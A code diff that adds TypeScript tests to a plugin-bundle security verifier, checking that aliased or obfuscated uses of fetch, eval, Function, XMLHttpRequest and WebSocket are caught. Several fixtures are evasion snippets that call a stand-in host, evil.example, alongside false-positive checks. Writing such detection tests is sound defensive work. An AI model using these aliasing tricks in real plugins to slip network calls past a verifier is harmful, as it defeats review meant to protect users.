@@ -234,6 +234,107 @@ describe('checkPluginBundle (AGL-426)', () => {
   })
 })
 
+describe('calls through an alias (AGL-1090)', () => {
+  // Every one of these passed verifier 3 — and the network row rendered a
+  // green "no network calls", which is worse than going quiet. Aliasing a
+  // VALUE was the exact gap this verifier was built to close.
+  const cases: Array<[string, string]> = [
+    ['a bare alias', `const f = fetch\nf('https://evil.example', {})`],
+    ['a global member', `const d = globalThis.fetch\nd('https://evil.example')`],
+    [
+      'a renamed destructure',
+      `const { fetch: h } = globalThis\nh('https://evil.example')`,
+    ],
+    [
+      'a shorthand destructure',
+      `const { fetch } = globalThis\nfetch('https://evil.example')`,
+    ],
+    [
+      'an alias of an aliased global',
+      `const g = globalThis\nconst d = g.fetch\nd('https://evil.example')`,
+    ],
+    [
+      'a computed member on a global',
+      `const d = globalThis['fe' + 'tch']\nd('https://evil.example')`,
+    ],
+    ['eval', `const e = eval\ne('1')`],
+    ['the Function constructor', `const F = Function\nF('return 1')()`],
+    ['XHR', `const X = XMLHttpRequest\nnew X()`],
+    ['WebSocket', `const W = WebSocket\nnew W('wss://evil.example')`],
+  ]
+
+  for (const [label, body] of cases) {
+    it(`resolves ${label}`, () => {
+      const result = checkPluginBundle(
+        `${body}\nexport function register() {}\n`,
+        { declaredNetwork: [] },
+      )
+      expect([label, result.ok]).toEqual([label, false])
+    })
+  }
+
+  it('leaves a method on an unknown object alone', () => {
+    // `host.fetch(…)` is the host ABI, not the global — resolving property
+    // names on arbitrary objects would flag half the bundles in the market.
+    const result = checkPluginBundle(
+      `const api = globalThis.__AGLYN_PLUGIN_HOST__.aglyn\n` +
+        `const f = api.fetch\n` +
+        `export function register() { f('/relative') }\n`,
+      { declaredNetwork: [] },
+    )
+    expect(result.ok).toBe(true)
+    expect(result.problems).toEqual([])
+  })
+
+  it('accepts an aliased call to a declared origin', () => {
+    const result = checkPluginBundle(
+      `const f = fetch\n` +
+        `export function register() { f('https://api.example.com/v1') }\n`,
+      { declaredNetwork: ['https://api.example.com'] },
+    )
+    expect(result.ok).toBe(true)
+  })
+})
+
+describe('a URL handed to a call nobody could follow (AGL-1090)', () => {
+  const statusOf = (result: ReturnType<typeof checkPluginBundle>) =>
+    result.checks.find((check) => check.id === 'network')?.status
+
+  it('questions it rather than passing it in silence', () => {
+    const result = checkPluginBundle(
+      `export function register(host) { host.track('https://telemetry.example.com/hit') }\n`,
+      { declaredNetwork: [] },
+    )
+    expect(result.ok).toBe(true)
+    expect(statusOf(result)).toBe('question')
+    expect(
+      result.checks.find((check) => check.id === 'network')?.detail,
+    ).toContain('could not follow')
+  })
+
+  it('says nothing about URL-shaped arguments that reach nothing', () => {
+    // An SVG namespace appears in a large share of real bundles; a question
+    // row on every one of them would train reviewers to ignore the column.
+    const result = checkPluginBundle(
+      `export function register() {\n` +
+        `  const u = new URL('https://api.example.com/x')\n` +
+        `  return document.createElementNS('http://www.w3.org/2000/svg', 'svg')\n` +
+        `}\n`,
+      { declaredNetwork: [] },
+    )
+    expect(result.ok).toBe(true)
+    expect(statusOf(result)).toBe('pass')
+  })
+
+  it('says nothing when the origin is declared', () => {
+    const result = checkPluginBundle(
+      `export function register(host) { host.track('https://api.example.com/hit') }\n`,
+      { declaredNetwork: ['https://api.example.com'] },
+    )
+    expect(statusOf(result)).toBe('pass')
+  })
+})
+
 describe('per-check summary (AGL-1087)', () => {
   const statusOf = (result: ReturnType<typeof checkPluginBundle>, id: string) =>
     result.checks.find((check) => check.id === id)?.status
